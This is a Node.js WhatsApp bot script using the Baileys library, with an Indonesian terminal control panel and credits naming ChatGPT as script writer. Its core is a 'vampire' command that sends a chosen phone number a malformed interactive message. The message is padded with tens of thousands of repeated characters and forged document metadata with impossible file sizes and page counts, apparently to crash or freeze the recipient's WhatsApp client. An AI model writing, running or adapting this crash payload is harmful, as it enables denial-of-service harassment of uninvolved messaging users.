const {
    default: makeWASocket,
    useMultiFileAuthState,
    fetchLatestBaileysVersion,
    generateWAMessageFromContent
} = require("@whiskeysockets/baileys");
const qrcode = require("qrcode-terminal");
const Pino = require("pino");
const readline = require("readline");
const fs = require("fs");

// ───────── GLOBAL STATE ─────────
let startTime = Date.now();
let msgCount = 0;
let errCount = 0;
let lastLog = "-";
let lastCPU = 0;
let reconnecting = false;
global.sock = null;

// CPU LIGHT
let lastCPUTime = process.cpuUsage();
setInterval(() => {
    const now = process.cpuUsage();
    lastCPU = ((now.user - lastCPUTime.user + now.system - lastCPUTime.system) / 1000).toFixed(1);
    lastCPUTime = now;
}, 1000);

// ───────── HELPERS ─────────
function formatUptime(ms) {
    let s = Math.floor(ms / 1000);
    let m = Math.floor(s / 60);
    let h = Math.floor(m / 60);
    s %= 60;
    m %= 60;
    return `${h}h ${m}m ${s}s`;
}
function getRam() {
    return (process.memoryUsage().rss / 1024 / 1024).toFixed(1) + " MB";
}
function green(t) { return `\x1b[32m${t}\x1b[0m`; }
function red(t) { return `\x1b[31m${t}\x1b[0m`; }
function yellow(t) { return `\x1b[33m${t}\x1b[0m`; }

// ───────── PANEL UI ─────────
function panel(status = global.currentStatus, device = global.currentDevice, ping = "-", showSource = false) {
    console.clear();
    console.log(`
┌─────────────────────────────────────────────┐
│          ${green("WHATSAPP BOT PANEL ULTRA")}        │
├─────────────────────────────────────────────┤
│ Status : ${status}
│ Device : ${device}
│ Uptime : ${formatUptime(Date.now() - startTime)}
│ CPU    : ${lastCPU} ms
│ RAM    : ${getRam()}
│ Ping   : ${ping}
│ Msg In : ${msgCount}
│ Errors : ${errCount}
├─────────────────────────────────────────────┤
│ Menu Interaktif:
│ 1) Restart Bot
│ 2) Refresh/Clear Panel
│ 3) Tampilkan QR Lagi
│ 4) Keluar/Log out
│ 5) About / Source
├─────────────────────────────────────────────┤
│ Log Terakhir:
│ ${yellow(lastLog)}
${showSource ? `
├─────────────────────────────────────────────┤
│ ${green("Source & Credits")}
│ Author       : Rangga
│ Script Writer: ChatGPT
│ Versi Bot    : Ultra Pairing Ready
` : ""}
└─────────────────────────────────────────────┘
`);
}

// ───────── TERMINAL MENU ─────────
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

function setupMenu(sock) {
    rl.removeAllListeners("line");
    rl.on("line", async (input) => {
        switch (input.trim()) {
            case "1": restartBot(); break;
            case "2": panel("Terhubung ✓", sock?.user?.id?.split(":")[0] || "-"); break;
            case "3": if (global.lastQR) qrcode.generate(global.lastQR, { small: true }); else console.log(red("Tidak ada QR.")); break;
            case "4": process.exit(0); break;
            case "5": panel("Terhubung ✓", sock?.user?.id?.split(":")[0] || "-", "-", true); break;
            default: console.log(yellow("Perintah tidak dikenal.")); break;
        }
    });
}

// ───────── RESTART BOT ─────────
function restartBot() {
    startTime = Date.now();
    msgCount = 0;
    errCount = 0;
    lastLog = "-";
    reconnecting = false;

    delete require.cache[require.resolve("./index.js")];
    process.removeAllListeners("uncaughtException");
    process.removeAllListeners("unhandledRejection");

    startBot();
}

// ───────── VAMPIRE FUNCTION FIX ─────────
async function VampireBlank(target, ptcp = true) {
    if (!global.sock) return console.log(red("Socket belum siap!"));

    const Vampire = `_*~@8~*_\n`.repeat(10500);
    const CrashNotif = 'ꦽ'.repeat(55555);

    const messageContent = {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: "https://mmg.whiskeysockets.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4",
                            mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                            fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                            fileLength: "9999999999999",
                            pageCount: 1316134911,
                            mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                            fileName: "𝐕𝐚𝐦𝐩𝐢𝐫𝐞",
                            fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                            directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4",
                            mediaKeyTimestamp: "1726867151",
                            contactVcard: true,
                        },
                        hasMediaAttachment: true,
                    },
                    body: { text: '𝐕𝐚𝐦𝐩𝐢𝐫𝐞 𝐇𝐞𝐫𝐞' + CrashNotif + Vampire },
                    footer: { text: '' },
                    contextInfo: {
                        mentionedJid: ["0@s.whatsapp.net"],
                    },
                },
            },
        },
    };

    await global.sock.relayMessage(
        target,
        messageContent,
        ptcp
            ? { participant: target }
            : {}
    );

    console.log(green(`Vampire message dikirim ke ${target}`));
}

// ───────── START BOT ─────────
async function startBot() {
    try {
        if (global.sock) {
            try { global.sock.end?.() } catch {}
            try { global.sock.ws?.close?.() } catch {}
        }

        const { state, saveCreds } = await useMultiFileAuthState("./auth");
        const { version } = await fetchLatestBaileysVersion();

        const sock = makeWASocket({
            version,
            auth: state,
            logger: Pino({ level: "silent" })
        });

        global.sock = sock;
        setupMenu(sock);
        panel("Menunggu QR...", "Belum Login");

        sock.ev.on("connection.update", ({ qr, connection, lastDisconnect }) => {
            if (qr) {
                global.lastQR = qr;
                panel("Scan QR!", "Belum Login");
                qrcode.generate(qr, { small: true });
            }
            if (connection === "open") {
                reconnecting = false;
                panel(green("Terhubung ✓"), sock.user.id.split(":")[0]);
            }
            if (connection === "close") {
                const code = lastDisconnect?.error?.output?.statusCode;
                if (code === 401) {
                    try { fs.rmSync("./auth", { recursive: true, force: true }); } catch {}
                    return restartBot();
                }
                if (!reconnecting) { reconnecting = true; setTimeout(startBot, 2500); }
            }
        });

        sock.ev.on("creds.update", saveCreds);

        // ───────── MESSAGES.UPSET HANDLER ─────────
        sock.ev.on("messages.upsert", async ({ messages }) => {
            const msg = messages[0];
            if (!msg.message) return;
            if (!msg.key.fromMe) msgCount++;

            const from = msg.key.remoteJid;
            const text =
                msg.message.conversation ||
                msg.message.extendedTextMessage?.text ||
                "";

            lastLog = `${from} → ${text}`;
            panel("Terhubung ✓", sock.user.id.split(":")[0]);

            const args = text.trim().split(" ");
            const command = args[0].toLowerCase();

            // ----- COMMAND: VAMPIRE -----
            if (command === "vampire") {
                const target = args[1];
                if (!target) {
                    await sock.sendMessage(from, { text: "Nomor tujuan tidak valid! masukkan awalan 628xxxx" });
                    return;
                }
                await VampireBlank(target);
                await sock.sendMessage(from, { text: `Vampire dikirim ke ${target}` });
                return;
            }

            // ----- COMMAND: PING -----
            if (command === "ping") {
                let t = Date.now();
                await sock.sendMessage(from, { text: "pong!" });
                let ping = Date.now() - t;
                panel("Terhubung ✓", sock.user.id.split(":")[0], ping + " ms");
                return;
            }
        });

        // ───────── ANTI-CRASH ─────────
        process.on("uncaughtException", (err) => {
            errCount++;
            lastLog = red("Error: " + err.message);
            panel(red("Error!"), "Running");
        });
        process.on("unhandledRejection", (err) => {
            errCount++;
            lastLog = red("Reject: " + err);
            panel(red("Error!"), "Running");
        });

    } catch (e) {
        console.log(red("Startup Error:"), e);
        setTimeout(startBot, 2000);
    }
}

startBot();